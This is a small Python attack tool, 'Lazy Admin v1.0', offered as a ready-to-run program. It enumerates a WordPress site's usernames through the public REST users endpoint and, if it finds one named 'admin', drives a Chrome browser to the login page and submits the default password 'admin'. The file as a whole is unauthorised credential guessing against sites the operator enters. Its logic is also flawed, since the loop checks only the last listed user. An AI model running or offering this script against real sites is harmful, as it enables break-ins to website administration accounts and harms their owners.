import requests
import os
from selenium import webdriver

print("  _                             _           _          ")  
print(" | |                           | |         (_)         ")
print(" | | __ _ _____   _    __ _  __| |_ __ ___  _ _ __     ")
print(" | |/ _` |_  / | | |  / _` |/ _` | '_ ` _ \| | '_ \    ") 
print(" | | (_| |/ /| |_| | | (_| | (_| | | | | | | | | | |   ")  
print(" |_|\__,_/___|\__, |  \__,_|\__,_|_| |_| |_|_|_| |_i   ")    
print("               __/ |                                   ")
print("              |___/                                    ")

print("                          ")
print("Lazy Admin v1.0 by NullWin")
print("                          ")

url = str(input("input wordpress site: "))
joint = url + "/wp-json/wp/v2/users"

urllogin = url + "/wp-admin"

two = requests.get(joint)
length = len(two.json())


for x in range(length):
    data = two.json()[x]['name']

if data == str("admin"):
    
    driver = webdriver.Chrome('C:\webdrivers\chromedriver.exe')
    driver.get(urllogin)

    user_input = driver.find_element_by_id('user_login')
    user_input.send_keys(data)

    password_input = driver.find_element_by_id('user_pass')
    password_input.send_keys("admin")

    login_button = driver.find_element_by_id('wp-submit')
    login_button.click()

else:
    print("No admin user found") 
